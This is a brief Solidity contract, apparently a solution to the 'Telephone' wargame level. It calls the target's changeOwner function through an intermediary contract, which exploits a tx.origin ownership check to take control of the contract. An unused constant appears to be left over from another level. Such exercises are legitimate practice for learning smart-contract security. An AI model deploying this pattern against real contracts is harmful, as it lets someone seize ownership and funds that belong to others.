// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Telephone.sol';

contract TelephoneFaker {
    Telephone public telephone;
    uint256 private FACTOR = 2**255;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function fake(address newSender) public {
        telephone.changeOwner(newSender);
    }
}